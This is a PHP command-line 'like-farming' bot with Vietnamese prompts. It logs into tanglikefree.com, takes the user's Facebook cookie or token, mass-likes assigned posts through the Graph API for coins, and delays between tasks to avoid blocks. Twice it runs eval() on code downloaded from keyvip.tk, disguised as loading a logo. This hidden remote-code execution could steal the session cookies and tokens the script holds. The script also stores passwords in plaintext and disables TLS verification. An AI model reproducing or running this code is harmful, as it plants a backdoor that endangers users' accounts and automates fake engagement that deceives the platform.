error_reporting(0); 
session_start(); 
$white= "\033[0;37m"; 
$green="\e[1;32m"; 
error_reporting(0);
$useragent="Mozilla/5.0 (Linux; Android 10; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36";
$green="\033[1;32m";
$wait = $green."WAIT";
$res="\033[0m";
$red="\033[1;31m";
$yellow="\033[0;93m";
$lightblue="\033[1;35m";
$bluelight="\033[1;34m";
$blue="\033[1;36m";
$purple="\e[35m";
$wait="Äá»£i";
$err="ERROR";
$do="\033[1;91m";
$maufulldo= "\e[1;47;31m";
$res="\033[0m";
$red="\e[1;31m";
$pink="\e[1;35m";
$green="\e[1;32m";
$yellow="\e[1;33m";
$y2="\033[0;33m";
$white= "\033[0;37m";
$cyan= "\e[1;36m";
$blue="\e[1;34m";
$ngreen="\033[42m";
$ngblack="\033[40m";
$nen="\033[1;47;1;34m";
$TIME=`date "+%H:%M"`;
date_default_timezone_set("Asia/Ho_Chi_Minh");
$i=0;
$dem=0;
@system("clear");
$_SESSION['check'] = file_exists("logtlf.txt");
if ($_SESSION['check'] =='1'){
echo  $green."Bạn Đã Đăng Nhập Trước Đó! Bấm \033[1;33mEnter\033[1;32m Để Tiếp Tục, Bấm\033[1;31m No\033[1;32m Để Nhập Nick Mới: ";
$_SESSION['nhap'] = trim(fgets(STDIN));
if ($_SESSION['nhap'] !='no' and $_SESSION['nhap'] != 'No' and $_SESSION['nhap'] !=''){
exit($red."\033[1;37m~\033[1;31m Lựa Chọn Không Xác Định\n");
}
@system("clear");
if ($_SESSION['nhap'] =='no' or $_SESSION['nhap'] =='No'){
$my = fopen("logtlf.txt", "w+");
echo "\e[1;95m┌─[\e[1;37m\e[1;42mNhập Tài Khoản Mới\e[0m\e[1;95m]
└──╼ \e[1;39m〉\e[1;36m〉\e[1;91m〉 : $vang";
$username =trim(fgets(STDIN));
echo "\e[1;95m┌─[\e[1;37m\e[1;42mNhập Mật Khẩu Mới\e[0m\e[1;95m]
└──╼ \e[1;39m〉\e[1;36m〉\e[1;91m〉 : $vang";
$passw =trim(fgets(STDIN));
$arr = array("username"=> $username, "password"=> $passw);
fwrite($my,json_encode($arr));
    $my = file("logtlf.txt");
$bb = file_get_contents('logtlf.txt');
$cc =json_decode($bb);
}
if ($_SESSION['nhap'] == ''){
$bb = file_get_contents("logtlf.txt");
$cc =json_decode($bb);
$username = $cc->{"username"};
$passw = $cc->{"password"};
}
} else {
$my = fopen("logtlf.txt","w+");
echo "\e[1;95m┌─[\e[1;37m\e[1;42mNhập Tài Khoản\e[0m\e[1;95m]
└──╼ \e[1;39m〉\e[1;36m〉\e[1;91m〉 : $vang";
$username =trim(fgets(STDIN));
echo "\e[1;95m┌─[\e[1;37m\e[1;42mNhập Mật Khẩu\e[0m\e[1;95m]
└──╼ \e[1;39m〉\e[1;36m〉\e[1;91m〉 : $vang";
$passw =trim(fgets(STDIN));
$arr = array("username"=> $username, "password"=> $passw);
fwrite($my,json_encode($arr));
}
$address="Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36";
$ch = curl_init();
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
    curl_setopt( $ch, CURLOPT_URL, 'https://tanglikefree.com/api/auth/login');
    curl_setopt( $ch, CURLOPT_COOKIEJAR, "tlf.txt" );
    curl_setopt( $ch, CURLOPT_USERAGENT, $address);
    $login = array(
         'username' => $username,
        'password' => $passw,
        'submit' => ' Đăng Nhập' 
    );
    curl_setopt( $ch, CURLOPT_POST, count( $login ) );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $login );
    curl_setopt( $ch, CURLOPT_COOKIEFILE, "tlf.txt" );
    $a = json_decode(curl_exec( $ch ));
    curl_close( $ch );
if($a->{"messages"}=='Đăng Nhập Thành Công'){
  echo "\033[1;37m~\033[1;32m Đăng Nhập Thành Công Công\n";
  $token = $a -> {"data"} -> {"access_token"};

  $url = 'https://tanglikefree.com/api/auth/user';
$ch = curl_init();
curl_setopt($ch, CURLOPT_PORT, "443");
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: tanglikefree.com',
'Connection: keep-alive',
//'Accept: application/json, text/plain, */*',
'X-Requested-With: XMLHttpRequest',
'User-Agent: '.$address,
'Authorization: Bearer '.$token,
'Referer: https://tanglikefree.com/makemoney',
'Accept-Encoding: gzip',
'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5'
));
curl_setopt($ch, CURLOPT_COOKIEFILE, "tlf.txt");
$bal1=json_decode(curl_exec($ch));
$tien = $bal1 -> {'data'} -> {'VND'};
$usr = $bal1 -> {'data'} -> {'username'};
$uidfb = $bal1 -> {'data'} -> {'idfb'};
curl_close($ch);
}
else{
  echo "\033[1;37m~\033[1;31m Đăng Nhập Thất Bại\n";
  exit;
}

@system('clear');
eval(file_get_contents("https://keyvip.tk/logo.php"));
echo $white."            $maufulldo Tool Tăng Like Free VIP $ngblack\n";
for($v=0;$v<= 12;$v++){
    echo "\033[1;37m- ";usleep(15000);
    echo "\033[1;31m- ";usleep(15000);
}
echo "\033[1;37m- ";usleep(15000);
echo "\033[1;31m-";usleep(15000);
echo"\n\n";
echo  "\033[1;32mNhập $red"."[".$green."1".$red."]".$res." =>".$green." TangLikeFree Cookie\n"; 
echo  "\033[1;32mNhập $red"."[".$green."2".$red."]".$res." =>".$green." TangLikeFree Token\n"; 
echo  $white." <=> \033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m =>\033[1;32m Nhập Chế Độ: \033[1;33m";
$choices = trim(fgets(STDIN));
if ($choices=='1'){
echo "\e[1;95m┌─[\e[1;37m\e[1;42mNhập Cookie Facebook\e[0m\e[1;95m]
└──╼ \e[1;39m〉\e[1;36m〉\e[1;91m〉 : $vang";
$cookiefb = trim(fgets(STDIN));
} else {
echo "\e[1;95m┌─[\e[1;37m\e[1;42mNhập Token Facebook\e[0m\e[1;95m]
└──╼ \e[1;39m〉\e[1;36m〉\e[1;91m〉 : $vang";
$access_token = trim(fgets(STDIN));
	}

if ($choices=='1'){
  

$access = cookie($cookiefb,$useragent);
if (explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0]){
$access_token = explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0];
}
}
if($idfb=json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'id'}){
}else{
  if ($choices=='1'){
	echo  $white."~ ".$red."Cookie Die, Hãy Kiểm Tra Lại\n";
  } else {
  echo  $white."~ ".$red."Token Die, Hãy Kiểm Tra Lại\n";
  }
	exit;
}
if($ten=json_decode(file_get_contents('https://graph.facebook.com/me/?access_token='.$access_token))->{'name'}){
}else{
	if ($choices=='1'){
echo  $white."~ ".$red."Cookie Die, Hãy Kiểm Tra Lại\n";
  } else {
  echo  $white."~ ".$red."Token Die, Hãy Kiểm Tra Lại\n";
  }
	exit;
}
if ($idfb!==$uidfb){
	echo  $white."~ ".$red."Nhập Đúng Cookie Của Facebook: $uidfb\n";
	exit;
}
@system('clear');
clear_now();
eval(file_get_contents("https://keyvip.tk/logo.php"));
echo $white."                 $maufulldo Tool Tăng Like Free VIP $ngblack\n";
for($v=0;$v<= 12;$v++){
    echo "\033[1;37m- ";usleep(15000);
    echo "\033[1;31m- ";usleep(15000);
}
echo "\033[1;37m- ";usleep(15000);
echo "\033[1;31m-";usleep(15000);
echo"\n";
echo  $white." 👤 ".$green."Tên Tài Khoản:$yellow $usr\n";
echo  $white." 💰 ".$green."Xu Hiện Tại° :$red $tien Xu\n";
echo  $white." 🍊 ".$green."Nick Đang Chạy :$lightblue $ten \n";
for($v=0;$v<= 12;$v++){
    echo "\033[1;37m- ";usleep(15000);
    echo "\033[1;31m- ";usleep(15000);
}
echo "\033[1;37m- ";usleep(15000);
echo "\033[1;31m-";usleep(15000);
echo"\n";
echo  $green."Bạn Muốn Tool Tự Đổi Thẻ Cào Khi Đủ Xu Không $yellow(y/n): $white";
$doithe = trim(fgets(STDIN));
if ($doithe=='y'){
	echo  $white."~ ".$red."[".$green."1".$red."]".$res." =>".$green." Thẻ Viettel\n";
	echo  $white."~ ".$red."[".$green."2".$red."]".$res." =>".$green." Thẻ Mobifone\n";
	echo  $white."~ ".$red."[".$green."3".$red."]".$res." =>".$green." Thẻ Vinaphone\n";
	echo  $white."~ \033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m =>\033[1;32m Nhập Loại Thẻ Cần Đổi: \033[1;36m"; 
$doi = trim(fgets(STDIN));
if ($doi !== '1' && $doi !== '2' && $doi !== '3'){
echo "\033[1;37m~\033[1;31m Lựa Chọn Không Xác Định\n";
	exit;
	}
	}
echo  $white."~ \033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m =>\033[1;32m Delay Nhiệm Vụ: \033[1;33m";
$delay = trim(fgets(STDIN));
echo  $white."~ \033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m =>\033[1;32m Sau Bao Nhiêu Nhiệm Vụ Dừng Tránh Block: \033[1;33m";
$block = trim(fgets(STDIN));
echo  $white."~ \033[1;31m[\033[1;32m✔\033[1;31m]\033[1;37m =>\033[1;32m Sau $red".$block.$green." Nhiệm Vụ Dừng Bao Nhiêu Giây: $yellow";
$delayblock = trim(fgets(STDIN));
for($v=0;$v<= 12;$v++){
    echo "\033[1;37m- ";usleep(15000);
    echo "\033[1;31m- ";usleep(15000);
}
echo "\033[1;37m- ";usleep(15000);
echo "\033[1;31m-";usleep(15000);
echo"\n";
while(true){
	if ($tien > 40000 && $doithe=='y'){
		
		$url = 'https://tanglikefree.com/api/auth/Withdraw/card';
$data = '{"nhamang":'.$doi.',"menhgia":10000,"disable":true}';
$ch = curl_init();
curl_setopt($ch, CURLOPT_PORT, "443");
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: tanglikefree.com',
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'X-Requested-With: XMLHttpRequest',
'Authorization: Bearer '.$token,
'User-Agent: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://tanglikefree.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://tanglikefree.com/makemoney',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5'
));
curl_setopt($ch, CURLOPT_COOKIEFILE, "tlf.txt");
$rut=json_decode(curl_exec($ch));
curl_close($ch);
if($rut->{'messages'} == 'Mua Thành Công'){
	if ($doi=='1'){
		$nhamang='VIETTEL';
		}
		if ($doi=='2'){
			$nhamang='MOBIFONE';
			}
			if ($doi=='3'){
			$nhamang='VINAPHONE';
			}
		echo $res."~".$red."[".$green."$nhamang".$red."]".$res." =>".$green." Đổi Thẻ Cào ".$yellow."10.000đ".$green." Thành Công";
		}}
$url = 'https://tanglikefree.com/api/auth/Post/getpost';
$ch = curl_init();
curl_setopt($ch, CURLOPT_PORT, "443");
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: tanglikefree.com',
'Connection: keep-alive',
//'Accept: application/json, text/plain, */*',
'X-Requested-With: XMLHttpRequest',
'User-Agent: '.$address,
'Authorization: Bearer '.$token,
'Referer: https://tanglikefree.com/makemoney',
'Accept-Encoding: gzip',
'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5'
));
curl_setopt($ch, CURLOPT_COOKIEFILE, "tlf.txt");
$bal1=json_decode(curl_exec($ch));
curl_close($ch);
foreach($bal1 as $job=>$key){
  $id = $key->{"idpost"};
  $color1=array($green, $res, $red, $yellow, $lightblue, $bluelight, $blue, $purple);
$color=$color1[array_rand($color1)];
$d=$dem+1;
echo "\r";
echo "                                                      \r";
echo $yellow."[$d]".$red." ● \033[1;35m[LMG]\033[1;31m ● ".$cyan; usleep(10000);
echo date("H:i"); usleep(10000);
echo $red." \033[1;32mLIKE\033[1;31m ●$white $id";


$url = 'https://tanglikefree.com/api/auth/creat_request';
$ch = curl_init();
curl_setopt($ch, CURLOPT_PORT, "443");
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: tanglikefree.com',
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'X-Requested-With: XMLHttpRequest',
'User-Agent: Mozilla/5.0 (Linux; Android 9; Mi A1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36',
'Authorization: Bearer '.$token,
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://tanglikefree.com/makemoney',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5'
));
curl_setopt($ch, CURLOPT_COOKIEFILE, "tlf.txt");
$bal1=json_decode(curl_exec($ch));
curl_close($ch);
$request_id = $bal1->{"request_id"};

//Like
$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
	curl_setopt($ch, CURLOPT_URL, 'https://graph.facebook.com/'.$id.'/likes');
	$head[] = "Connection: keep-alive";
	$head[] = "Keep-Alive: 300";
	$head[] = "authority: m.facebook.com";
	$head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
	$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
	$head[] = "cache-control: max-age=0";
	$head[] = "upgrade-insecure-requests: 1";
	$head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
	$head[] = "sec-fetch-site: none";
	$head[] = "sec-fetch-mode: navigate";
	$head[] = "sec-fetch-user: ?1";
	$head[] = "sec-fetch-dest: document";
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
	curl_setopt($ch, CURLOPT_ENCODING, '');
	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
	curl_setopt($ch, CURLOPT_TIMEOUT, 60);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
	$data = array('access_token' => $access_token);
	curl_setopt($ch, CURLOPT_POST,count($data));
	curl_setopt($ch, CURLOPT_POSTFIELDS,$data);
	$access = curl_exec($ch);
	curl_close($ch);
	$acc=json_decode($access,true);
	if ($acc["error"]["code"] == '190' or $acc["error"]["message"]== "Error validating access token: The session has been invalidated because the user changed their password or Facebook has changed the session for security reasons."){
	
if ($choices=='1'){
	echo $res."~".$red." Cookie Die\n";
echo $res."~ ".$green."Nhập Lại Cookie Facebook Mói:\033[1;37m ";
$cookiefb = trim(fgets(STDIN));
$ch=curl_init();
curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4 );
curl_setopt($ch, CURLOPT_TCP_FASTOPEN, true);
curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed');
$head[] = "Connection: keep-alive";
$head[] = "Keep-Alive: 300";
$head[] = "authority: m.facebook.com";
$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
$head[] = "cache-control: max-age=0";
$head[] = "upgrade-insecure-requests: 1";
$head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
$head[] = "sec-fetch-site: none";
$head[] = "sec-fetch-mode: navigate";
$head[] = "sec-fetch-user: ?1";
$head[] = "sec-fetch-dest: document";
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36');
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIE, $cookiefb);
curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
$access = curl_exec($ch);
curl_close($ch);
if (explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0]){
$access_token = explode('\",\"useLocalFilePreview',explode('accessToken\":\"', $access)[1])[0];
}else{
	echo $res."\r~".$red." Cookie Die Tiếp\n";
	exit();
	}

}else{
	echo $res."\r~ ".$green."Nhập Lại Token Facebook Mới:\033[1;37m ";
$access_token = trim(fgets(STDIN));
	}
	
	
	
	}

$url = 'https://tanglikefree.com/api/auth/Post/submitpost';
$data = '{"idpost":"'.$id.'","request_id":"'.$request_id.'"}';
$ch = curl_init();
curl_setopt($ch, CURLOPT_PORT, "443");
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: tanglikefree.com',
'Connection: keep-alive',
'Accept: application/json, text/plain, */*',
'X-Requested-With: XMLHttpRequest',
'Authorization: Bearer '.$token,
'User-Agent: Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36',
'Content-Type: application/json;charset=UTF-8',
'Origin: https://tanglikefree.com',
'Sec-Fetch-Site: same-origin',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Dest: empty',
'Referer: https://tanglikefree.com/makemoney',
'Accept-Encoding: gzip, deflate, br',
'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5'
));
curl_setopt($ch, CURLOPT_COOKIEFILE, "tlf.txt");
$bal1=json_decode(curl_exec($ch));
curl_close($ch);
if($bal1->{'messages'} == 'Bạn Đã Nhận 41Đ Vào Tài Khoản'){
	$get = $red." |".$green." +41 ";
	$mystr = array($get);
$string = strlen($get);
	$url = 'https://tanglikefree.com/api/auth/user';
$ch = curl_init();
curl_setopt($ch, CURLOPT_PORT, "443");
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_ENCODING, "");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: tanglikefree.com',
'Connection: keep-alive',
//'Accept: application/json, text/plain, */*',
'X-Requested-With: XMLHttpRequest',
'User-Agent: '.$address,
'Authorization: Bearer '.$token,
'Referer: https://tanglikefree.com/makemoney',
'Accept-Encoding: gzip',
'Accept-Language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5'
));
curl_setopt($ch, CURLOPT_COOKIEFILE, "tlf.txt");
$bal1=json_decode(curl_exec($ch));
$tien = $bal1 -> {'data'} -> {'VND'};
curl_close($ch);
  $i++;$dem++; $max++;
  
echo $red." ●$green Thành Công\033[1;37m[+41] $red"."●$yellow $tien Coin\n";
if ($max == $block){
  unset($max);
  echo "\r";
  echo "                                                      \r";
  for($j = $delayblock;$j> 0;$j--){
  echo $green."Đang Chờ Delay Tránh Block$yellow $j Giây";
  sleep(1);
  echo "\r";
echo "                                                      \r";
           }
}
loadtime($delay);
echo "\r";
echo "                                                      \r";
}else{
  echo $red." ●$green"." ".$bal1 -> {'messages'}."\r";

}
}}
function clear_now(){ DIRECTORY_SEPARATOR === '\\' ? popen('cls', 'w') : exec('clear'); }
function gettenfb($id,$token){
  $b = file_get_contents("https://graph.facebook.com/".$id."?fields=name&access_token=".$token);
  $s = json_decode($b)->{"name"};
  return $s; 
}
function loadtime($time){
        for ( $x = $time; $x--; $x ) {
       echo "\e[1;32m● Vui Lòng Chờ \033[1;37m".$x." \e[1;32mGiây\r";
       sleep(1);
}
}
function cookie($cookie,$useragent){
$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed');
$head[] = "Connection: keep-alive";
$head[] = "Keep-Alive: 300";
$head[] = "authority: m.facebook.com";
$head[] = "ccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
$head[] = "accept-language: vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5";
$head[] = "cache-control: max-age=0";
$head[] = "upgrade-insecure-requests: 1";
$head[] = "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9";
$head[] = "sec-fetch-site: none";
$head[] = "sec-fetch-mode: navigate";
$head[] = "sec-fetch-user: ?1";
$head[] = "sec-fetch-dest: document";
curl_setopt($ch, CURLOPT_USERAGENT,$useragent );
curl_setopt($ch, CURLOPT_ENCODING, '');
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_TIMEOUT, 60);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
$access = curl_exec($ch);
curl_close($ch);
return $access;
}
